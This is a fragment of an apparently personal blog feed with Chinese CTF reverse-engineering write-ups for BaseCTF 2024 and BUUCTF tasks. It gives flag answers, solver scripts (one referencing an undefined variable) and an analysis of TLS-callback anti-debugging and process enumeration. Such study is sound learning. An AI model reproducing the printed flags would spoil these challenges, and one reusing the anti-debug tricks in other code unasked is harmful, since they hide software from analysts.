    <summary type="html">&lt;h1 id=&quot;🐏羊城杯2024-Reverse-docCrack&quot;&gt;&lt;a href=&quot;#🐏羊城杯2024-Reverse-docCrack&quot; class=&quot;headerlink&quot; title=&quot;🐏羊城杯2024 | Reverse_docCrack&quot;&gt;&lt;/a&gt;🐏羊城杯2</summary>
      
    
    
    
    
    <category term="OJ" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/OJ/"/>
    
  </entry>
  
  <entry>
    <title>BaseCTF2024</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/08/24/BaseCTF2024_Reverse/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/08/24/BaseCTF2024_Reverse/</id>
    <published>2024-08-23T16:00:00.000Z</published>
    <updated>2024-09-16T07:56:07.701Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BaseCTF2024-Week1"><a href="#BaseCTF2024-Week1" class="headerlink" title="BaseCTF2024[Week1]"></a>BaseCTF2024[Week1]</h1><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="You-are-good-at-IDA"><a href="#You-are-good-at-IDA" class="headerlink" title="You are good at IDA"></a>You are good at IDA</h3><h4 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h4><p>打开IDA按F5，得到第一部分</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824135041482.png" alt="image-20240824135041482"></p><h4 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h4><p>根据以上提示，shift+F2:</p><p>Second字符点击进入，按“X”交叉引入找到对应函数，</p><p>得到第二部分flag，按“R”转换为字符：</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824135517153.png" alt="image-20240824135517153"></p><h4 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h4><p>第三部分flag在一个Interesting的函数中：</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824135453999.png" alt="image-20240824135453999"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824135535863.png" alt="image-20240824135535863"></p><h4 id="flag"><a href="#flag" class="headerlink" title="flag:"></a>flag:</h4><p>BaseCTF{Y0u_4Re_900d_47_id4}</p><h3 id="UPX-mini"><a href="#UPX-mini" class="headerlink" title="UPX mini"></a>UPX mini</h3><p>拖DIE中查壳儿，4.01版本</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824140522684.png" alt="image-20240824140522684"></p><p><code>upx -d  UPXmini.exe</code></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824143602786.png" alt="image-20240824143602786"></p><p>点击base64函数，发现没换表，有密文，直接出flag</p><p>附一个标准base64：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">base64_encode</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">72</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// [rsp+68h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+74h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> *Str; <span class="comment">// [rsp+78h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+80h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+84h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  Str = a1;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v1 = v6 % <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v6 % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">1</span>;</span><br><span class="line">    v11 = <span class="number">4</span> * (v6 / <span class="number">3</span> + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">2</span>;</span><br><span class="line">    v11 = <span class="number">4</span> * (v6 / <span class="number">3</span> + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    v11 = <span class="number">4</span> * (v6 / <span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = <span class="built_in">malloc</span>(v11 + <span class="number">1</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v8 &lt; v6 - v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[v9] = v4[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v8] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    v5[v9 + <span class="number">1</span>] = v4[((<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v8 + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * Str[v8]) &amp; <span class="number">0x30</span>];</span><br><span class="line">    v5[v9 + <span class="number">2</span>] = v4[((<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v8 + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * Str[v8 + <span class="number">1</span>]) &amp; <span class="number">0x3C</span>];</span><br><span class="line">    v5[v9 + <span class="number">3</span>] = v4[Str[v8 + <span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v8 += <span class="number">3</span>;</span><br><span class="line">    v9 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v10 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[v11 - <span class="number">4</span>] = v4[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v6 - <span class="number">1</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    v5[v11 - <span class="number">3</span>] = v4[(<span class="number">16</span> * Str[v6 - <span class="number">1</span>]) &amp; <span class="number">0x30</span>];</span><br><span class="line">    v2 = &amp;v5[v11 - <span class="number">1</span>];</span><br><span class="line">    *v2 = <span class="number">61</span>;</span><br><span class="line">    v5[v11 - <span class="number">2</span>] = *v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v10 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[v11 - <span class="number">4</span>] = v4[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v6 - <span class="number">2</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    v5[v11 - <span class="number">3</span>] = v4[((<span class="type">int</span>)(<span class="type">unsigned</span> __int8)Str[v6 - <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * Str[v6 - <span class="number">2</span>]) &amp; <span class="number">0x30</span>];</span><br><span class="line">    v5[v11 - <span class="number">2</span>] = v4[(<span class="number">4</span> * Str[v6 - <span class="number">1</span>]) &amp; <span class="number">0x3C</span>];</span><br><span class="line">    v5[v11 - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v5[v11] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Ez-Xor"><a href="#Ez-Xor" class="headerlink" title="Ez Xor"></a>Ez Xor</h3><p>无壳</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824144240382.png" alt="image-20240824144240382"></p><p>看逻辑，判断输入字符为28位，处理v4(假设为密钥”Xor”)，加密输入字符，与密文比较——</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824144219198.png" alt="image-20240824144219198"></p><p>Set item type 改数据类型</p><p>异或串1由i异或key循环产生28位</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824154936713.png" alt="image-20240824154936713"></p><p>flag与 逆转的异或串1 异或产生字符串Str</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824193746260.png" alt="image-20240824193746260"></p><p>最后Str与给的密文比较</p><p>逻辑也简单，写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">0x58</span>,<span class="number">0x6F</span>,<span class="number">0x72</span>] <span class="comment">#Xor转16进制</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">box = []</span><br><span class="line">b = <span class="string">&quot;&quot;</span></span><br><span class="line">Str = [</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x2D</span>, <span class="number">0x0B</span>, <span class="number">0x1D</span>, </span><br><span class="line">    <span class="number">0x24</span>, <span class="number">0x7A</span>, <span class="number">0x31</span>, <span class="number">0x20</span>, <span class="number">0x1E</span>, <span class="number">0x49</span>, <span class="number">0x3D</span>, <span class="number">0x67</span>, </span><br><span class="line">    <span class="number">0x4D</span>, <span class="number">0x50</span>, <span class="number">0x08</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x6E</span>, <span class="number">0x05</span>, <span class="number">0x34</span>, </span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x40</span>, <span class="number">0x3b</span>, <span class="number">0x25</span>, ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">28</span>):</span><br><span class="line">   flag +=<span class="built_in">chr</span>(i ^ enflag[<span class="number">27</span>-i] ^ key[i%<span class="number">3</span>] )</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># BaseCTF&#123;X0R_I5_345Y_F0r_y0U&#125; </span></span><br></pre></td></tr></table></figure><h3 id="ez-maze"><a href="#ez-maze" class="headerlink" title="ez_maze"></a>ez_maze</h3><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824200108696.png" alt="image-20240824200108696"></p><p>wa！迷宫！</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824200625193.png" alt="image-20240824200625193"></p><p>出来啦！<code>sssssssddddwwwddsssssssdddsssddddd</code></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824200720082.png" alt="image-20240824200720082"></p><h3 id="BasePlus"><a href="#BasePlus" class="headerlink" title="BasePlus"></a>BasePlus</h3><p>看题目，看main函数：</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824200822549.png" alt="image-20240824200822549"></p><p>encode：看着像base64，但是Plus！细细看，不只是换了表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Encode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// r9</span></span><br><span class="line">  __int64 v5; <span class="comment">// r8</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ebp</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">bool</span> v12; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">bool</span> v13; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [rsp+8h] [rbp-40h]</span></span><br><span class="line">  __int16 v15; <span class="comment">// [rsp+9h] [rbp-3Fh]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v16; <span class="comment">// [rsp+Bh] [rbp-3Dh]</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">60</span>]; <span class="comment">// [rsp+Ch] [rbp-3Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(result) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v17;</span><br><span class="line">    v5 = <span class="number">4</span>i64;</span><br><span class="line">    v6 = <span class="number">0</span>i64;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v15 = <span class="number">0</span>;</span><br><span class="line">      v16 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = v7 + <span class="number">1</span>;</span><br><span class="line">        v11 = <span class="number">1</span>i64;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = v10;</span><br><span class="line">          *(&amp;v14 + v11) = a1[v10 - <span class="number">1</span>];</span><br><span class="line">          v12 = (<span class="type">int</span>)v11 &lt;= <span class="number">2</span>;</span><br><span class="line">          v13 = v3 &gt; (<span class="type">int</span>)v10++;</span><br><span class="line">          ++v11;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v13 &amp;&amp; v12 );</span><br><span class="line">      &#125;</span><br><span class="line">      v17[<span class="number">0</span>] = Secret[(<span class="type">unsigned</span> __int8)v15 &gt;&gt; <span class="number">2</span>];</span><br><span class="line">      v17[<span class="number">1</span>] = Secret[(HIBYTE(v15) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (_BYTE)v15) &amp; <span class="number">0x30</span>];</span><br><span class="line">      v17[<span class="number">2</span>] = Secret[(v16 &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * HIBYTE(v15)) &amp; <span class="number">0x3C</span>];</span><br><span class="line">      v17[<span class="number">3</span>] = Secret[v16 &amp; <span class="number">0x3F</span>];</span><br><span class="line">      v8 = v6;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(_BYTE *)(a2 + v8) = v4[v8] ^ <span class="number">0xE</span>;</span><br><span class="line">        ++v8;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v8 != v5 );</span><br><span class="line">      LODWORD(result) = v5;</span><br><span class="line">      v6 += <span class="number">4</span>i64;</span><br><span class="line">      v4 -= <span class="number">4</span>;</span><br><span class="line">      v5 += <span class="number">4</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &gt; v7 );</span><br><span class="line">  &#125;</span><br><span class="line">  result = (<span class="type">int</span>)result;</span><br><span class="line">  *(_BYTE *)(a2 + (<span class="type">int</span>)result) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824201050815.png" alt="image-20240824201050815"></p><p>果然结果异或0xE</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240824201316243.png" alt="image-20240824201316243"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BaseCTF2024-Week1&quot;&gt;&lt;a href=&quot;#BaseCTF2024-Week1&quot; class=&quot;headerlink&quot; title=&quot;BaseCTF2024[Week1]&quot;&gt;&lt;/a&gt;BaseCTF2024[Week1]&lt;/h1&gt;&lt;h2 id=&quot;Rev</summary>
      
    
    
    
    
    <category term="CTF RE" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF-RE/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF 2023 WEEK4|REVERSE kooh_slT</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/08/12/BUUCTF%202023%20WEEK4REVERSE%20kooh_slT/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/08/12/BUUCTF%202023%20WEEK4REVERSE%20kooh_slT/</id>
    <published>2024-08-11T16:00:00.000Z</published>
    <updated>2024-09-16T07:18:21.909Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF-2023-WEEK4-REVERSE-kooh-slT"><a href="#BUUCTF-2023-WEEK4-REVERSE-kooh-slT" class="headerlink" title="BUUCTF 2023 WEEK4|REVERSE kooh_slT"></a>BUUCTF 2023 WEEK4|REVERSE kooh_slT</h1><p>参考博客：<br><a href="http://www.chillysome.top/index.php/2024/03/15/tls%e5%9b%9e%e8%b0%83%e5%87%bd%e6%95%b0-%e4%b8%80%e6%96%87%e7%9c%8b%e6%87%82%ef%bc%88%e8%af%a6%ef%bc%89/">TLS回调函数–一文看懂（详）</a></p><p><a href="https://www.cnblogs.com/NozoMizo/articles/17788108.html">NewstarCTF2023 week4 re </a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h4 id="main函数："><a href="#main函数：" class="headerlink" title="main函数："></a>main函数：</h4><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240811165013781.png" alt="image-20240811165013781"></p><blockquote><p> <code>calloc</code>不仅分配内存，还会将分配的内存初始化为0。</p></blockquote><p>创建了一个新的线程，线程的起始地址是<code>StartAddress</code>函数。<code>CreateThread</code>函数返回的线程句柄存储在<code>hHandle</code>中</p><p>WaitForSingleObject(hHandle, 0xFFFFFFFF);</p><p>这里的<code>WaitForSingleObject</code>函数用于等待线程<code>hHandle</code>执行完毕。<code>0xFFFFFFFF</code>（即<code>INFINITE</code>）表示无限等待，直到线程执行完成。</p><p>sub401500明显是base64</p><h4 id="进入StartAddress："><a href="#进入StartAddress：" class="headerlink" title="进入StartAddress："></a>进入StartAddress：</h4><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240811171621563.png" alt="image-20240811171621563"></p><p>在声明变量、创建快照、初始化之后</p><blockquote><p><code>CreateToolhelp32Snapshot</code> 创建一个进程快照，参数 <code>2u</code> 表示快照类型为所有进程。如果创建失败（即返回 <code>INVALID_HANDLE_VALUE</code> 或 <code>(HANDLE)-1</code>），函数直接返回 <code>0</code>，表示失败。</p><p><code>pe.dwSize</code> 必须设置为 <code>PROCESSENTRY32W</code> 结构体的大小，以便调用 <code>Process32FirstW</code> 函数时正确使用</p></blockquote><p>似乎什么都没有做，看汇编，有一部分是灰色的，花指令：</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240811172330917.png" alt="image-20240811172330917"></p><p>先把跳转函数nop</p><p>直接Crtl+N容易把后面信息也nop了，这里shift+F2</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240811185021197.png" alt="image-20240811185021197"></p><p>剩了点，一会重新分析就好，按C分析，下面还有一部分</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240811185127542.png" alt="image-20240811185127542"></p><p>全部重新分析后可以看到完整的函数：</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240811234931637.png" alt="image-20240811234931637"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hSnapshot = CreateToolhelp32Snapshot(<span class="number">2u</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( hSnapshot == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>CreateToolhelp32Snapshot</code> 传入的参数 <code>2u</code> 表示获取系统中所有的进程快照。成功时返回一个快照句柄，失败时返回 <code>INVALID_HANDLE_VALUE</code> (通常为 <code>(HANDLE)-1</code>)。</li><li>如果 <code>CreateToolhelp32Snapshot</code> 返回 <code>-1</code>，函数立即返回 <code>0</code>，表示失败。</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( Process32FirstW(hSnapshot, &amp;pe) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">      <span class="comment">//在每次循环中，代码通过 `wcscmp` 比较当前进程名称 `pe.szExeFile` 与存储在 `word_4A7010` 的9个进程名称（每个名称长度为50个字节）进行比较</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">     wcscmp(pe.szExeFile, (<span class="type">const</span> <span class="type">wchar_t</span> *)&amp;word_4A7010[<span class="number">50</span> * i]);</span><br><span class="line">    OpenProcess(<span class="number">0x1FFFFF</span>u, <span class="number">0</span>, pe.th32ProcessID);<span class="comment">//调用 `OpenProcess` 尝试打开进程，标志值 `0x1FFFFFu` 代表所需的所有访问权限。</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">//在循环结束后（即没有匹配的进程名），关闭快照句柄，并调用 `sub_401500` 进行进一步的处理，然后返回 `1`，表示成功。</span></span><br><span class="line">  <span class="keyword">while</span> ( Process32NextW(hSnapshot, &amp;pe) );</span><br><span class="line">  CloseHandle(hSnapshot);</span><br><span class="line">  sub_401500(byte_4A7E74, dword_4A7E70, Str1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//如果 `Process32FirstW` 失败，表示没有进程信息可枚举，直接关闭句柄并返回 `0`。</span></span><br><span class="line">&#123;</span><br><span class="line">  CloseHandle(hSnapshot);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>似乎中间有个死循环，怪不得动调了一阵子都动不了……</p><p>再改：</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812003624975.png" alt="image-20240812003624975"></p><p>终于对了：<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812004235808.png" alt="image-20240812004235808"></p><p>题目是TLS，看旁边函数</p><h4 id="TlsCallback-0："><a href="#TlsCallback-0：" class="headerlink" title="TlsCallback_0："></a>TlsCallback_0：</h4><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812000053323.png" alt="image-20240812000053323"></p><p>学到一个很好的修改检测反调试方法：</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812000405368.png" alt="image-20240812000405368"></p><blockquote><p> 师傅说：（记笔记）<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812000131184.png" alt="image-20240812000131184"></p></blockquote><p>不太懂TLScallback，去网上搜索</p><p>首先是TLS：</p><blockquote><p>Thread Local Storage，线程局部存储：各线程独立的数据存储空间。使用TLS技术可以在线程内部独立使用或修改进程的全局数据或静态数据， 就像对待自身的局部变量一样</p><p>TLS回调函数常用于反调试，主要是利用了TLS回调函数的调用要先于EP代码的执行</p><p>如果开启了TLS功能，PE文件头就会设置TLS表，IMAGE_NT_HEADERS-IMAGE_OPTIONAL_HEADER-IMAGE_DATA_DIRECTORY[9]描述了IMAGE_TLS_DIRECTORY结构体的位置。</p><p># 作者(Author)：chillysome<br># 链接(URL)：<a href="http://www.chillysome.top/index.php/2024/03/15/tls%e5%9b%9e%e8%b0%83%e5%87%bd%e6%95%b0-%e4%b8%80%e6%96%87%e7%9c%8b%e6%87%82%ef%bc%88%e8%af%a6%ef%bc%89/">http://www.chillysome.top/index.php/2024/03/15/tls%e5%9b%9e%e8%b0%83%e5%87%bd%e6%95%b0-%e4%b8%80%e6%96%87%e7%9c%8b%e6%87%82%ef%bc%88%e8%af%a6%ef%bc%89/</a></p></blockquote><p>所以上面while循环有9次，似乎也有些关系</p><p>继续搜，TLS回调函数，每当创建或终止进程的线程时会自动调用执行的函数。</p><p>参数顺序和定义是一样的，第一个参数是模块句柄、第二个标识调用TLS回调函数原因，有4：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_PROCESS_ATTACH 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_THREAD_ATTACH 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_THREAD_DETACH 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 